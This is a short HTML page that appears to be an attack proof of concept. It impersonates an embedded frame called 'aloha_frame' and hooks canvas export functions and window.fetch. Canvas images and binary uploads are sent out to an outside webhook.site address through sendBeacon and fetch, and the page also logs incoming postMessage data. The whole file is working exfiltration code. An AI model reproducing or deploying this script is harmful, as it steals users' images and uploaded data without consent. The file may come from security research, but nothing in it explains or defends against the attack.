<!DOCTYPE html>
<html>
  <body>
    <h2>receiver.html loaded</h2>
    <script>
      window.name = "aloha_frame";
      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322";

      // ðŸŸ¥ Inject visual marker
      document.body.style.background = "red";
      document.body.style.color = "white";
      document.body.innerHTML += "<h3>ðŸŸ¥ RED BACKGROUND INJECTED</h3>";

      // ðŸŽ¯ Hook canvas methods
      const originalToBlob = HTMLCanvasElement.prototype.toBlob;
      const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
      const originalGetContext = HTMLCanvasElement.prototype.getContext;

      HTMLCanvasElement.prototype.toBlob = function(callback, ...args) {
        console.log("ðŸ§ª canvas.toBlob() triggered");
        return originalToBlob.call(this, (...cbArgs) => {
          navigator.sendBeacon(webhookURL, cbArgs[0]);
          callback(...cbArgs);
        }, ...args);
      };

      HTMLCanvasElement.prototype.toDataURL = function(...args) {
        const result = originalToDataURL.apply(this, args);
        console.log("ðŸ§ª canvas.toDataURL() = ", result.slice(0, 100));
        fetch(webhookURL, {
          method: "POST",
          mode: "no-cors",
          body: JSON.stringify({ dataURL: result.slice(0, 300) })
        });
        return result;
      };

      HTMLCanvasElement.prototype.getContext = function(type, ...args) {
        console.log("ðŸ§ª getContext:", type);
        return originalGetContext.call(this, type, ...args);
      };

      // ðŸ§² Existing intercepts
      const _fetch = window.fetch;
      window.fetch = async (...args) => {
        const [url, opts] = args;
        let body = opts?.body;
        if (body instanceof Blob || body instanceof ArrayBuffer) {
          console.log("ðŸ“¦ Intercepted fetch() binary upload:", url);
          navigator.sendBeacon(webhookURL, body);
        }
        return _fetch(...args);
      };

      const _sendBeacon = navigator.sendBeacon;
      navigator.sendBeacon = (url, data) => {
        console.log("ðŸ“¡ Intercepted sendBeacon:", url, data);
        return _sendBeacon(url, data);
      };

      // ðŸ” postMessage listener
      window.addEventListener("message", async (e) => {
        console.log("ðŸ“© postMessage from:", e.origin);
        console.log("ðŸ§¾ Raw data:", e.data);
      });

      console.log("âœ… receiver.html active and impersonating aloha_frame");
    </script>
  </body>
</html>
